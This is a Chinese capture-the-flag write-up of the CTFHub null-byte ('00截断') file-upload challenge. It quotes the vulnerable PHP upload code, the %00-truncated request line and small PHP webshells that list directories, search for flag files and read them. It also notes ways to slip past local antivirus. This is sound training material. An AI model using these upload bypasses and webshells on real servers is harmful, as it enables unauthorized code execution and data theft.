【CTFHub】Web-00截断 Writeup

操作者：何芊宏 | 操作日期：2026.9.17 | 分类：CTF | 标签：CTFHub, Web, 文件上传, 00截断, BurpSuite

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - 文件上传 / 00截断
  • 题目名称：00截断
  • 提示：了解 PHP 5.2.0 截断上传的原理

2. 解题思路

本题目的是通过 PHP 5.2.0 版本中存在的“00截断”漏洞来绕过服务器的白名单和后缀校验。经过代码审计发现，后端将上传的文件重命名保存到 $_GET['road'] 拼接的路径下。当 C 语言底层字符串遇到 %00 时会发生截断，我们可以构造 URL 参数为 /?road=/var/www/html/upload/shell.php%00，使最终保存的文件名固定为 shell.php，从而绕过对图片后缀的检测。

3. 操作步骤

第一步：初探与自动化尝试

起初尝试用 Python 脚本上传带有 PHP 代码的文件。编写了 111.py 进行上传测试。过程中遇到两个严重问题：

  • 路径报错：由于 Windows 隐藏了文件扩展名，导致脚本报 FileNotFoundError，找不到真实的文件路径。
  • Requests库自动转义：在 URL 中手动拼接 %00 时，Python 的 requests 库会自动将其转义为 %2500，导致服务器接收到的字符失去截断效果，导致上传失败。

第二步：本地环境被拦截

尝试在 VS Code 或记事本中直接给真实图片（2.jpg、3.jpg）末尾添加 PHP 木马代码。但在保存时，Windows Defender 立刻弹窗报毒，导致文件无法正常编辑或直接被锁定。同时，在另存为图片时，由于忘记将保存类型改为“所有文件”，导致后缀名变成了 3.jpg.txt，引发了后续的路径报错。

第三步：代码审计寻找破局点

查阅官方 Writeup 并审计服务器源码，发现核心逻辑如下：

$name = basename($_FILES['file']['name']);
$ext = $info['extension'];
$whitelist = array("jpg", "png", "gif");
if (in_array($ext, $whitelist)) {
    $des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;
    if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) { ... }
}

分析得出：不能修改文件名，必须保持 jpg 后缀以通过白名单；破局点在于修改 GET 参数 road，利用 %00 截断路径。

第四步：Burp Suite 精确制导（成功）

放弃 Python 脚本，回归最纯粹的 Burp Suite 拦截改包：

  1. 在 VS Code 中新建文件，写入纯文本木马 <?php system('ls /'); ?>，保存为 3.jpg（选择“所有文件”类型）。
  2. 开启 Burp 拦截（Intercept is on），在 Burp 浏览器中上传该 3.jpg。
  3. 拦截到 POST 请求后，切到 Raw 视图，将第一行的 URL 修改为：
    POST /?road=/var/www/html/upload/shell.php%00 HTTP/1.1
  4. 点击 Forward 放行请求，关闭拦截。浏览器提示“上传成功”。
  5. 在浏览器地址栏访问 http://题目URL/upload/shell.php，成功执行命令并显示根目录列表。

第五步：全盘搜索并读取 Flag（详细操作流程）

已知根目录没有 flag，我们需要两次重新上传木马，分别用来“寻找路径”和“读取内容”：

📍 第一次重新上传（寻找 flag 文件路径）

  1. 修改代码：在 VS Code 中打开 3.jpg，把代码替换为：
    <?php system('find / -name "flag*" 2>/dev/null'); ?>
    按 Ctrl + S 保存。
  2. 开启拦截：切回 Burp，点击 Proxy -> Intercept，确认 Intercept is on（开启拦截）。
  3. 上传文件：切回 Burp 浏览器，选择刚保存的 3.jpg，点击 Submit。
  4. 修改 URL：拦截到 POST 请求后，在 Raw 视图第一行将 URL 改为：
    POST /?road=/var/www/html/upload/shell.php%00 HTTP/1.1
  5. 放行请求：点击橙色 Forward 放行，然后点击 Intercept is on 变成 off（关闭拦截）。
  6. 获取路径：在浏览器访问 http://题目URL/upload/shell.php，页面会打印出 Flag 文件的绝对路径（如 /var/www/html/flag_2292524873.php）。记下这个路径。

📍 第二次重新上传（读取 flag 内容）

  1. 修改代码：回到 VS Code，把代码替换为（注意替换成上一步真实的路径）：
    <?php echo htmlspecialchars(file_get_contents('/var/www/html/flag_2292524873.php')); ?>
    按 Ctrl + S 保存（如果杀毒软件拦截，点允许）。
  2. 开启拦截：切回 Burp，再次开启拦截 Intercept is on。
  3. 再次上传：切回浏览器，选择更新后的 3.jpg，点击 Submit。
  4. 再次改 URL：在 Burp 的 Raw 视图第一行，再次加上截断代码：
    POST /?road=/var/www/html/upload/shell.php%00 HTTP/1.1
  5. 放行并访问：点击 Forward，关闭拦截。在浏览器刷新 http://题目URL/upload/shell.php，Flag 就会直接显示在页面上！

4. 踩坑记录与复盘

  • Windows 的“自作聪明”（文件扩展名陷阱）：在 VS Code 另存为文件时，如果未选择“所有文件”类型，系统会自动追加默认后缀（如 .txt）。这会导致后续 Python 报找不到文件，或者服务器白名单校验直接拦截。务必在文件夹设置中开启“显示文件扩展名”来核对真实名称。
  • 不要迷信自动化脚本：Python 的 requests 库在处理 URL 参数时非常“聪明”，它会自动对特殊字符进行 URL 编码。遇到需要精确控制 %00 等特殊字节的场景，手动使用 Burp Suite 拦截改包是最稳妥的方法。
  • 本地杀毒软件与网络发包的区别：Windows Defender 会拦截本地文件中的木马，但在网络请求中传输木马字符串通常不会。我们要学会在 Burp 里直接修改数据包，绕过本地环境的限制。
  • 截断位置的判断：这题的截断点在于 URL 参数拼接的路径，而不是文件名本身。必须仔细审计源代码，找到 $des = $_GET['road'] . "/" . ... 这一行，才能准确找到注入 %00 的位置。

5. 知识总结

  • PHP 5.2.0 00 截断漏洞：当 PHP 底层使用 C 语言函数处理字符串时，遇到空字节 %00 会认为字符串已结束。利用这一特性可以截断原本要拼接的文件后缀或目录路径，实现绕过。
  • WebShell 交互进阶：上传的木马不仅可以执行简单的 ls，还可以执行 find 全盘搜索，并通过 file_get_contents 读取特定文件内容。结合 htmlspecialchars 可以安全地将内容输出到浏览器。
  • 安全防御建议：升级 PHP 版本，废弃旧版不安全的字符串处理方式；对用户可控的路径参数进行严格的校验；使用白名单机制限制上传文件类型。
